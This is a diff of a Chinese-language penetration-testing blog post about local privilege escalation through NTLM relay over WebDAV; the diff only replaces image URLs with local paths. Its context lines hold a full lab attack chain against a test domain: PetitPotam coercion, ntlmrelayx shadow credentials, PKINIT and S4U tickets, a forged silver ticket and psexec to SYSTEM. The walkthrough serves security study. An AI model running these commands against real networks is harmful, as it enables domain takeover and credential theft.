@@ -39,7 +39,7 @@ Windows 使用 WebClient 服务实现 WebDAV，允许 Windows 应用程序通过
 
 为了更加直观，我们可以使用 Netcat 在攻击者的机器上启动一个 Socket 监听，例如监听本地 TCP 80 端口，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220514234016724.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220514234016724.png)
 
 为了能让开启了 WebClient 服务的客户端成功访问到了我们，我们需要通过已获取的域用户权限，在域内为攻击机添加一个 DNS 记录。因为在默认情况下，WebClient 仅对本地内部网（Local Intranet）或受信任的站点（Trusted Sites）列表中的目标使用 “默认凭据” 进行身份验证。这里我们可以使用 Dirk-jan Mollema（[@dirkjanm](https://twitter.com/_dirkjan)）的 [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) 工具来完成，如下图所示。
 
@@ -47,7 +47,7 @@ Windows 使用 WebClient 服务实现 WebDAV，允许 Windows 应用程序通过
 python3 dnstool.py -u pentest.com\\Marcus -p Marcus\@123 -r evilhost.pentest.com -d 172.26.10.134 --action add dc01.pentest.com
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220514235033017.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220514235033017.png)
 
 然后，我们可以通过 PetitPotam 强制开启了 WebClient 服务的客户端连接到攻击机的 80 端口，如下图所示。
 
@@ -55,7 +55,7 @@ python3 dnstool.py -u pentest.com\\Marcus -p Marcus\@123 -r evilhost.pentest.com
 python3 PetitPotam.py -d pentest.com -u marcus -p Marcus\@123 evilhost@80/webdav 172.26.10.21
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515013843612.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515013843612.png)
 
 如上图所示，Netcat 上收到了一个 HTTP OPTIONS 请求。根据 `User-Agent` 头部字段的值，我们可知这仅仅是一个 WebDAV 请求。为了让客户端对我们的 80 端口执行身份验证，我们应该回复并发送身份认证请求，相关数据如下：
 
@@ -107,7 +107,7 @@ while True:
 
 如下图所示，当客户端再次连接到攻击机的 80 端口时，将向攻击机执行 NTLM 身份验证：
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515014102864.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515014102864.png)
 
 ## NTLM Relay over HTTP (Webdav)
 
@@ -169,7 +169,7 @@ int main()
 
 我们以下图所示的网络环境为例，对相关利用步骤进行测试。假设攻击者已经获取了 WEB01 的控制权，并在该机器上设置 Socks5 代理进入内网。右侧的内网环境不出网，但相互之间可以访问。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515110214613.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515110214613.png)
 
 |    节点    |      主机名（FQDN）       |                     IP                     |
 | :--------: | :-----------------------: | :----------------------------------------: |
@@ -181,7 +181,7 @@ int main()
 
 假设我们已经获取了一个域标准用户（Pentest\Marcus）权限，并成功登陆了客户端主机 WIN10-CLIENT1。然后我们通过执行 StartWebClientService 在 WIN10-CLIENT1 上启动 WebClient 服务，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515020421121.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515020421121.png)
 
 由于内网主机 WIN10-CLIENT1 无法出网，因此无法直接通过代理执行 NTLM Relay，不过我们可以通过已经沦陷的 WEB01 作为中转。如下所示，在 Ubuntu 上执行以下命令，将 WEB01 上 8080 端口接收到的数据转发到 Kali Linux 上的 80 端口：
 
@@ -195,7 +195,7 @@ socat tcp-listen:8080,reuseaddr,fork tcp:192.168.2.148:80
 proxychains4 python3 ntlmrelayx.py -domain pentest.com -t ldaps://dc01.pentest.com --shadow-credentials --shadow-target win10-client1\$
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515103933264.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515103933264.png)
 
 通过 PetitPotam 强制 WIN10-CLIENT1 对 WEB01 的 8080 端口执行身份验证，验证请求将通过端口转发到 Kali Linux 的 80 端口上，并由 ntlmrelayx.py 接收。
 
@@ -205,7 +205,7 @@ proxychains4 python3 PetitPotam.py -d pentest.com -u Marcus -p Marcus\@123 ubunt
 
 如下图所示，执行 PetitPotam 后，ntlmrelayx.py 捕获身份验证请求后，将其中继到 LDAP/s 并成功为 WIN10-CLIENT1 设置 `msDS-KeyCredentialLink`。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515103844068.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515103844068.png)
 
 在 ntlmrelayx.py 的末尾给出了后续 PKINITtools 的利用命令，执行该命令可以为 WIN10-CLIENT1 请求 TGT 票据，如下图所示。
 
@@ -213,7 +213,7 @@ proxychains4 python3 PetitPotam.py -d pentest.com -u Marcus -p Marcus\@123 ubunt
 proxychains4 python3 ~/PKINITtools/gettgtpkinit.py -cert-pfx tE3so2th.pfx -pfx-pass ybZgtDIWaNNcDfv5Rh85 pentest.com/win10-client1$ tE3so2th.ccache
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515104039699.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515104039699.png)
 
 ### S4U To SYSTEM
 
@@ -223,7 +223,7 @@ proxychains4 python3 ~/PKINITtools/gettgtpkinit.py -cert-pfx tE3so2th.pfx -pfx-p
 proxychains4 python3 ~/PKINITtools/gets4uticket.py kerberos+ccache://pentest.com\\win10-client1\$:tE3so2th.ccache@dc01.pentest.com cifs/win10-client1.pentest.com@pentest.com Administrator@pentest.com Administrator.ccache -v
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515104132460.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515104132460.png)
 
 然后，我们通过设置环境变量 `KRB5CCNAME` 来使用 Administrator 用户的票据，并通过 psexec.py 获取 WIN10-CLIENT1 的 SYSTEM 权限，如下图所示。
 
@@ -232,7 +232,7 @@ export KRB5CCNAME=Administrator.ccache
 proxychains4 python3 psexec.py -k pentest.com/Administrator@win10-client1.pentest.com -no-pass
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515104316788.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515104316788.png)
 
 ### Create a Silver Ticket
 
@@ -243,7 +243,7 @@ export KRB5CCNAME=tE3so2th.ccache
 proxychains4 python3 ~/PKINITtools/getnthash.py -key f0386cb579ba5f039a61a49fbde2e612822b80eff81434925d3f16a3f033af06 -dc-ip 172.26.10.11 pentest.com/win10-client1\$
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515113257597.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515113257597.png)
 
 获取 WIN10-CLIENT1 账户的 NTLM Hash后，再通过 lookupsid.py 查看域 SID，如下图所示。
 
@@ -251,7 +251,7 @@ proxychains4 python3 ~/PKINITtools/getnthash.py -key f0386cb579ba5f039a61a49fbde
 python3 lookupsid.py pentest.com/Marcus:Marcus\@123@dc01.pentest.com
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220517084340037.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220517084340037.png)
 
 
 现在我们可以对 WIN10-CLIENT1 机器的 HOST 服务伪造白银票据，如下图所示。
@@ -260,7 +260,7 @@ python3 lookupsid.py pentest.com/Marcus:Marcus\@123@dc01.pentest.com
 proxychains4 python3 ticketer.py -domain-sid S-1-5-21-1536491439-3234161155-253608391 -domain pentest.com -spn host/win10-client1.pentest.com -nthash c4cc14098ac9587dea92f952457be6aa Administrator
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515113708829.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515113708829.png)
 
 最后，通过设置环境变量 `KRB5CCNAME` 来使用票据，并通过 psexec.py 获取 WIN10-CLIENT1 的 SYSTEM 权限，如下图所示。
 
@@ -269,5 +269,5 @@ export KRB5CCNAME=Administrator.ccache
 proxychains4 python3 psexec.py -k pentest.com/Administrator@win10-client1.pentest.com -no-pass
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515113832504.png)
+![](/assets/posts/2022-05-02-privilege-escalation-ntlmrelay2self-over-http-webdav/image-20220515113832504.png)
 ## Ending......
